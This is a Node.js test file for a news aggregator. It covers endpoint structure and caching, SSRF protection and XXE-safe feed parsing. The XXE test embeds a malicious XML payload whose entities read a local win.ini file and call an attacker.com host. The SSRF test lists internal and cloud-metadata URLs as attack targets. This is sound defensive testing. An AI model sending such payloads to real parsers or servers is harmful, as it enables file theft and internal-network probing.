const test = require('node:test');
const assert = require('node:assert');
const { validateFeedUrlSafe, parseFeedXmlSafe, isPrivateIp } = require('../news-aggregator');

const BASE_URL = process.env.TEST_URL || 'http://localhost:3000';

test('Phase 3 News: Live Aggregation Endpoint Delivery & Structure', async () => {
  const res = await fetch(`${BASE_URL}/api/news`);
  assert.strictEqual(res.status, 200, 'GET /api/news must return 200 OK');

  const data = await res.json();
  assert.strictEqual(data.success, true);
  assert.strictEqual(data.status, 'success');
  assert.ok(Array.isArray(data.items), 'items must be an array');
  assert.ok(data.items.length > 0, 'must contain news items');

  const first = data.items[0];
  assert.ok(first.id, 'item must have id');
  assert.ok(first.title, 'item must have title');
  assert.ok(first.summary, 'item must have summary');
  assert.ok(first.source, 'item must have source');
  assert.ok(first.url && first.url.startsWith('http'), 'item must have valid url');
  assert.ok(first.publishedAt, 'item must have publishedAt ISO timestamp');
  assert.ok(['bullish', 'cautionary', 'neutral'].includes(first.sentiment), 'item must have classified sentiment');

  // Second fetch within TTL must return cached: true
  const cachedRes = await fetch(`${BASE_URL}/api/news`);
  assert.strictEqual(cachedRes.status, 200);
  const cachedData = await cachedRes.json();
  assert.strictEqual(cachedData.cached, true, 'Subsequent request within TTL must be served from cache');
});

test('Phase 3 News: Server-Side Request Forgery (SSRF) Protection', async () => {
  // Test private IP detector directly
  assert.strictEqual(isPrivateIp('127.0.0.1'), true, '127.0.0.1 must be recognized as loopback');
  assert.strictEqual(isPrivateIp('10.0.0.1'), true, '10.0.0.1 must be recognized as private');
  assert.strictEqual(isPrivateIp('172.16.0.1'), true, '172.16.0.1 must be recognized as private');
  assert.strictEqual(isPrivateIp('192.168.1.1'), true, '192.168.1.1 must be recognized as private');
  assert.strictEqual(isPrivateIp('169.254.169.254'), true, '169.254.169.254 (Cloud metadata) must be recognized as link-local');
  assert.strictEqual(isPrivateIp('::1'), true, 'IPv6 loopback ::1 must be recognized as private');
  assert.strictEqual(isPrivateIp('8.8.8.8'), false, '8.8.8.8 is a public IP');

  // Test validateFeedUrlSafe on malicious targets
  const loopbackCheck = await validateFeedUrlSafe('http://127.0.0.1/evil.xml');
  assert.strictEqual(loopbackCheck.safe, false, 'Loopback IP must be rejected');

  const metadataCheck = await validateFeedUrlSafe('http://169.254.169.254/latest/meta-data/');
  assert.strictEqual(metadataCheck.safe, false, 'Cloud metadata IP must be rejected');

  const localhostCheck = await validateFeedUrlSafe('http://localhost:8080/feed.rss');
  assert.strictEqual(localhostCheck.safe, false, 'localhost hostname must be rejected');

  const privateDnsCheck = await validateFeedUrlSafe('http://router.internal/feed');
  assert.strictEqual(privateDnsCheck.safe, false, '.internal domains must be rejected');

  // Public domain must pass
  const publicCheck = await validateFeedUrlSafe('https://finance.yahoo.com/news/rssindex');
  assert.strictEqual(publicCheck.safe, true, 'Public HTTPS domain must be accepted');
});

test('Phase 3 News: XML External Entity (XXE) Safe Parsing', () => {
  const maliciousXxePayload = `<?xml version="1.0"?>
    <!DOCTYPE test [
      <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
      <!ENTITY stolen SYSTEM "http://attacker.com/leak">
    ]>
    <rss version="2.0">
      <channel>
        <title>Malicious News Feed</title>
        <item>
          <title>Breaking News &xxe; &stolen;</title>
          <description>Secret content: &xxe;</description>
          <link>https://example.com/clean</link>
          <pubDate>Wed, 07 Oct 2026 12:00:00 GMT</pubDate>
        </item>
      </channel>
    </rss>`;

  const items = parseFeedXmlSafe(maliciousXxePayload, 'Security Test Feed', 'Litigation');
  assert.strictEqual(items.length, 1, 'Safe parser should extract valid node content');

  const item = items[0];
  assert.ok(!item.title.includes('win.ini'), 'DOCTYPE entity expansion must NOT execute');
  assert.ok(!item.summary.includes('win.ini'), 'DOCTYPE entity expansion must NOT execute in summary');
  assert.strictEqual(item.source, 'Security Test Feed');
  assert.strictEqual(item.category, 'Litigation');
});
